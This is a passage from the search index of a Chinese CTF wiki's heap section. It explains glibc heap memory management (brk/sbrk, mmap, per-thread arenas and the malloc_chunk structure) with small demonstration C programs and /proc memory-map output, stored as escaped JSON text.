\u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ ##include <stdio.h> ##include <unistd.h> ##include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( curr_brk + 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); brk ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x804b000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x804b000 brk = 0x804c000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 Program Break Location2:0x804c000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk 0804b000-0804c000 rw-p 00000000 00 :00 0 [ heap ] b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002 00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002 0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002","title":"(s)brk"},{"location":"pwn/heap/heap_overview/#mmap","text":"malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ ##include <stdio.h> ##include <sys/mman.h> ##include <sys/types.h> ##include <sys/stat.h> ##include <fcntl.h> ##include <unistd.h> ##include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( - 1 ); } int main () { int ret = - 1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( ret == - 1 ) errExit ( \"munmap\" ); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } \u5728\u6267\u884cmmap\u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap\u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$","title":"mmap"},{"location":"pwn/heap/heap_overview/#_5","text":"\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ ##include <stdio.h> ##include <stdlib.h> ##include <pthread.h> ##include <unistd.h> ##include <sys/types.h> void * threadFunc ( void * arg ) { printf ( \"Before malloc in thread 1 \\n \" ); getchar (); char * addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in thread 1 \\n \" ); getchar (); free ( addr ); printf ( \"After free in thread 1 \\n \" ); getchar (); } int main () { pthread_t t1 ; void * s ; int ret ; char * addr ; printf ( \"Welcome to per thread arena example::%d \\n \" , getpid ()); printf ( \"Before malloc in main thread \\n \" ); getchar (); addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in main thread \\n \" ); getchar (); free ( addr ); printf ( \"After free in main thread \\n \" ); getchar (); ret = pthread_create ( & t1 , NULL , threadFunc , NULL ); if ( ret ) { printf ( \"Thread creation error \\n \" ); return - 1 ; } ret = pthread_join ( t1 , & s ); if ( ret ) { printf ( \"Thread join error \\n \" ); return - 1 ; } return 0 ; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002 \u6ce8\u610f\uff1a \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$","title":"\u591a\u7ebf\u7a0b\u652f\u6301"},{"location":"pwn/heap/heap_overview/#_6","text":"sploitfun","title":"\u53c2\u8003\u6587\u732e"},{"location":"pwn/heap/heap_structure/","text":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u00b6 \u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002 Overview\uff1f\uff1f\uff1f\uff1f \u00b6 \u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002 \u5fae\u89c2\u7ed3\u6784 \u00b6 \u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c \u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173 \u3002 malloc_chunk \u00b6 \u6982\u8ff0 \u00b6 \u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk \u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002 \u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784 \u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002 malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of chunk sizes. The default version is the same as size_t. While not strictly necessary, it is best to define this as an unsigned type, even if size_t is a signed type. This may avoid some artificial size limitations on some systems. On a 64-bit machine, you may be able to reduce malloc overhead by defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the expense of not being able to handle more than 2^32 of malloced space. If this limitation is acceptable, you are encouraged to set this unless you are on a platform requiring 16byte alignments. In this case the alignment requirements turn out to negate any potential advantages of decreasing size_t word size. Implementors: Beware of the possible combinations of: - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits, and might be the same width as int or as long - size_t might have different width and signedness as INTERNAL_SIZE_T - int and long might be 32 or 64 bits, and might be the same width To deal with this, most comparisons and difference computations among INTERNAL_SIZE_Ts should cast them to unsigned long, being aware of the fact that casting an unsigned int to a wider long does not sign-extend. (This also makes checking for negative numbers awkward.) Some of these casts result in harmless compiler warnings on some systems. */ #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size , \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09 